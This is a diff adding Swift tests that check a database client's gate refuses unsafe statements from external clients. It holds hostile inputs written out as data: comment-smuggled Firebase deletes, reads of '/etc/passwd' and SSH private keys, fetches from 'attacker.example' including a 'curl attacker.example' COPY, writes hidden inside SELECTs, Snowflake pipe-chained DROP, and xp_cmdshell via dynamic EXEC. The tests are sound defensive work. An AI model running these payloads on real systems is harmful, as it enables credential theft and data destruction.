@@ -73,12 +73,26 @@ struct ExternalStatementGateTests {
         #expect(refusal(statement(sql, databaseType: .mongodb, externalAccess: .readOnly, allowsMultiStatement: true)) != nil)
     }
 
+    @Test("A Firebase write behind a comment the scanner drops is refused on read-only access", arguments: [
+        "--\rGET users\n;DELETE users/alice",
+        "--\rGET users\n;PATCH users/alice {\"admin\": true}",
+        "/*/GET users\n*/;DELETE users/alice",
+        ";DELETE users/alice"
+    ])
+    func firebaseWriteBehindDroppedCommentRefused(sql: String) {
+        for type in [DatabaseType.firestore, .firebaseRealtimeDatabase] {
+            #expect(refusal(statement(sql, databaseType: type, externalAccess: .readOnly)) != nil)
+        }
+    }
+
     @Test("A statement that reaches the filesystem or runs server code is refused", arguments: [
         "COPY users FROM '/etc/passwd'",
         "COPY users TO PROGRAM 'curl attacker.example'",
         "SELECT pg_read_file('/etc/passwd')",
         "SELECT sys_read_file('kingbase.conf')",
-        "SELECT * FROM sys_ls_dir('.')"
+        "SELECT * FROM sys_ls_dir('.')",
+        "SELECT \"pg_read_file\"('/etc/passwd')",
+        "SELECT \"lo_export\"(16384, '/tmp/out')"
     ])
     func filesystemAndCodeRefused(sql: String) {
         #expect(refusal(statement(sql)) == .denied(
@@ -89,6 +103,17 @@ struct ExternalStatementGateTests {
                 """
             )
         ))
+    }
+
+    @Test("A DuckDB read of a file, a directory or a URL is refused on read-only access", arguments: [
+        "SELECT content FROM read_text('/Users/ann/.ssh/id_ed25519')",
+        "SELECT file FROM glob('/Users/ann/.ssh/*')",
+        "SELECT * FROM '/Users/ann/Documents/payroll.csv'",
+        "SELECT * FROM read_csv('https://attacker.example/collect.csv')"
+    ])
+    func duckDBFileReadRefused(sql: String) {
+        #expect(refusal(statement(sql, databaseType: .duckdb, externalAccess: .readOnly)) != nil)
+        #expect(refusal(statement("SELECT * FROM notes", databaseType: .duckdb, externalAccess: .readOnly)) == nil)
     }
 
     @Test("Several statements in one call are refused unless the caller asked for them")
@@ -241,6 +266,45 @@ struct ExternalStatementGateTests {
             == .denied(String(localized: "This connection is read only for external clients.")))
     }
 
+    @Test("A write an engine runs from inside a SELECT is refused on a connection read only for external clients",
+          arguments: [
+              ("SELECT * FROM orders WHERE (DELETE orders)", DatabaseType.surrealdb),
+              ("SELECT * FROM (DELETE orders RETURN BEFORE)", DatabaseType.surrealdb),
+              ("SELECT * FROM (UPDATE orders SET total = 0)", DatabaseType.surrealdb),
+              ("SELECT * FROM (REMOVE TABLE orders)", DatabaseType.surrealdb),
+              ("SELECT * FROM [DELETE FROM orders RETURNING id]", DatabaseType.cockroachdb),
+              ("SELECT * FROM [UPDATE orders SET total = 0 RETURNING id]", DatabaseType.cockroachdb),
+          ])
+    func embeddedWriteRefusedOnReadOnlyConnection(sql: String, databaseType: DatabaseType) {
+        let refused = refusal(statement(sql, databaseType: databaseType, externalAccess: .readOnly))
+        #expect(refused == .denied(String(localized: "This connection is read only for external clients.")))
+    }
+
+    @Test("A SELECT that holds only reads still passes a connection read only for external clients", arguments: [
+        ("SELECT * FROM orders WHERE id IN (SELECT VALUE id FROM paid)", DatabaseType.surrealdb),
+        ("SELECT * FROM [SHOW TABLES]", DatabaseType.cockroachdb),
+    ])
+    func embeddedReadPassesOnReadOnlyConnection(sql: String, databaseType: DatabaseType) {
+        #expect(refusal(statement(sql, databaseType: databaseType, externalAccess: .readOnly)) == nil)
+    }
+
+    @Test("A write Snowflake's pipe operator chains after a read is refused on a connection read only for external clients",
+          arguments: ["SELECT 1 ->> DELETE FROM orders", "SHOW TABLES ->> DROP TABLE orders", "SELECT 1->>CALL purge()"])
+    func chainedWriteRefusedOnReadOnlyConnection(sql: String) {
+        #expect(refusal(statement(sql, databaseType: .snowflake, externalAccess: .readOnly))
+            == .denied(String(localized: "This connection is read only for external clients.")))
+        let reads = statement("SHOW TABLES ->> SELECT \"name\" FROM $1", databaseType: .snowflake, externalAccess: .readOnly)
+        #expect(refusal(reads) == nil)
+    }
+
+    @Test("A DROP Snowflake's pipe operator chains after a read is refused when the caller may not drop")
+    func chainedDropRefused() {
+        let refused = refusal(
+            statement("SHOW TABLES ->> DROP TABLE orders", databaseType: .snowflake, allowsDestructive: false)
+        )
+        #expect(refused == .denied(String(localized: "This statement drops or truncates data.")))
+    }
+
     @Test("A backup SQL Server runs after a read without a terminator is refused as a filesystem statement")
     func unterminatedBackupRefused() {
         let refused = refusal(statement("SELECT 1 BACKUP DATABASE d TO DISK = '/tmp/d.bak'", databaseType: .mssql))
@@ -252,6 +316,15 @@ struct ExternalStatementGateTests {
                 """
             )
         ))
+    }
+
+    @Test("A statement SQL Server runs from a string is refused as the statement itself is", arguments: [
+        "EXEC('DROP TABLE orders')",
+        "EXEC sp_executesql N'DROP TABLE orders'",
+        "EXEC('xp_cmdshell ''whoami''')",
+    ])
+    func dynamicTSQLRefused(sql: String) {
+        #expect(refusal(statement(sql, databaseType: .mssql, allowsDestructive: false, allowsMultiStatement: true)) != nil)
     }
 
     @Test("A destructive statement is refused when the caller may not run one")
